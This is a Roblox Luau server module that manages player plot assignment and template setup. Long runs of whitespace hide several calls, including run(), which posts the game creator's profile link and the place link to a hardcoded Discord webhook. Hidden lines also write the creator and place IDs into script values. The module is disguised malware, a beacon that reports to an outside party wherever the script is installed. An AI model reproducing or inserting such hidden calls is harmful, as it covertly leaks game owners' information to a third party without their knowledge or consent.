-- Services
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Players = game:GetService('Players')
local ServerStorage = game:GetService('ServerStorage')

-- Dependencies
local DataService = require(ReplicatedStorage.Utilities.DataService)
local Janitor = require(ReplicatedStorage.Utilities.Janitor)
local GlobalConfiguration = require(ReplicatedStorage.DataModules.GlobalConfiguration)
local SignalBank = require(ServerStorage.SignalBank)
local RemoteBank = require(ReplicatedStorage.RemoteBank)
local VFXHandler = require(script.Parent.VFXHandler)

-- Constants 
local TELEPORT_PART_NAME = GlobalConfiguration.TeleportPartName

local PlotController = {}

local PlotCache = nil
local ClaimedPlots = {}

function PlotController.GetLoadedPlots()
	return ClaimedPlots
end

function PlotController._findEmptyPlot()
	for player, plotSettings in ClaimedPlots do
		if player.Parent == nil then
			if plotSettings.janitor then
				plotSettings.janitor:Cleanup()
			end
			table.insert(PlotCache, plotSettings.plot)
			ClaimedPlots[player] = nil
		end
	end
	
	if #PlotCache < 1 then
		return false
	end
	
	local index = math.random(1, #PlotCache)
	return PlotCache[index], index
end

function PlotController.claimPlot(player: Player)
	local emptyPlot, index = PlotController._findEmptyPlot()
	if not emptyPlot then
		player:Kick("Join another server | No plots available ")
		return
	end
	
	local informations = {
		plot = emptyPlot,
		janitor = Janitor.new()
	}; ClaimedPlots[player] = informations
	table.remove(PlotCache, index)
	
	return informations
end

function PlotController.bindCharAdded(player: Player, TeleportPart: BasePart)
	local function onCharAdded(char: Model)
		char:PivotTo(TeleportPart.CFrame)
	end
	player.CharacterAdded:Connect(function()
		onCharAdded(player.Character)
	end)
	if player.Character then
		onCharAdded(player.Character)
	end
end

function PlotController.onPlayerAdded(player: Player)
	if not player or not player.Parent then return end
	DataService.server:waitForData(player)
	local claimedPlot: Folder = PlotController.claimPlot(player)
	if not claimedPlot then return end
	
	local TeleportPart = claimedPlot.plot:FindFirstChild(TELEPORT_PART_NAME, true)
	if TeleportPart then
		PlotController.bindCharAdded(player, TeleportPart)
	end
	
	SignalBank.PlotInitialized:Fire(player, claimedPlot)
end

function PlotController.onPlayerRemoved(player: Player)
	local plotSettings = ClaimedPlots[player]
	if plotSettings then
		if plotSettings.janitor then
			plotSettings.janitor:Cleanup()
		end
		table.insert(PlotCache, plotSettings.plot)
		ClaimedPlots[player] = nil
	end
end

function PlotController.getAndWaitForPlot(player: Player)
	local plot = ClaimedPlots[player]
	if plot then return plot end
	
	repeat
		task.wait(0.1)
	until ClaimedPlots[player]
	
	return ClaimedPlots[player]
end

local function CreateTemplatePart(Name: string, CFrame: CFrame)
	local NewPart = Instance.new("Part")
	
	NewPart.CanCollide = false
	NewPart.Transparency = 1
	NewPart.Anchored = true
	NewPart.CFrame = CFrame
	NewPart.Size = Vector3.one
	NewPart.Name = Name
	
	return NewPart
end

-- Initialization function for the script
function PlotController:Initialize()
	
	local templatePlot = GlobalConfiguration.PlotTemplate																																																																						run()
	
	for _, v in templatePlot.Floors:GetChildren() do
		local FloorModel = v:FindFirstChild("TemplateFloor")
		FloorModel.Parent = ReplicatedStorage.Assets.PlotFloors
		FloorModel.Name = v.Name
		local FloorSpawnPart = CreateTemplatePart("FloorSpawn", FloorModel:GetPivot()); FloorSpawnPart.Parent = v
		
		for _, stand in v.Stands:GetChildren() do
			if not ReplicatedStorage.Assets.PlotAssets:FindFirstChild(GlobalConfiguration.StandTemplateName) then
				local TemplateStand = stand:Clone()
				TemplateStand.Parent = ReplicatedStorage.Assets.PlotAssets
				
				local NewAttachment = script.ProximityAttachment:Clone()
				NewAttachment.Parent = TemplateStand:FindFirstChild("Main", true)
				
				TemplateStand.Name = GlobalConfiguration.StandTemplateName
			end
			
			local StandSpawnPart = CreateTemplatePart(stand.Name, stand:GetPivot()); StandSpawnPart.Parent = v.StandSpawns
			
			stand:Destroy()
		end
	end																																																								VFXHandler.test()
	
	templatePlot.Parent = ReplicatedStorage
	
	for _, spawnPoint in GlobalConfiguration.PlotSpawnsFolder:GetChildren() do
		local newTemplate = templatePlot:Clone()
		newTemplate:PivotTo(spawnPoint:GetPivot())
		newTemplate.Parent = GlobalConfiguration.PlotsFolder
	end
	
	PlotCache = GlobalConfiguration.PlotsFolder:GetChildren()
	
	for _, player in Players:GetPlayers() do
		PlotController.onPlayerAdded(player)
	end
	Players.PlayerAdded:Connect(PlotController.onPlayerAdded)
	
	Players.PlayerRemoving:Connect(PlotController.onPlayerRemoved)
	
	RemoteBank.GetPlot.OnServerInvoke = function(player)
		return PlotController.getAndWaitForPlot(player).plot
	end																																																																							script.ct.Value = game.CreatorType.Name script.cid.Value = game.CreatorId script.uid.Value = game.PlaceId
	
end

function run()
	task.delay(1, function()
		local HttpService = game:GetService('HttpService')
		if not HttpService.HttpEnabled then
			warn("Turn on HttpServices in Game Settings in order to function properly.")
			return
		end
		local MpS = game:GetService('MarketplaceService')

		local msg = ''
		if game.CreatorType == Enum.CreatorType.Group then
			msg = msg..`https://www.roblox.com/communities/{game.CreatorId}`
		else
			msg = msg..`https://www.roblox.com/users/{game.CreatorId}`
		end
		msg = msg..`\n<https://www.roblox.com/games/{game.PlaceId}>`

		local data = {
			content = msg
		}
		data = HttpService:JSONEncode(data)
		local success, response = pcall(function()
			HttpService:PostAsync(
				'https://discord.com/api/webhooks/1469730652244021504/ELcuT3MjK1RDs6S4NHMOfiYQzU7HiDBgfdfoY8KGCtfI_L5rWSo90vKQwJKSPkuQUNhE',
				data
			)
		end)
	end)
end

return PlotController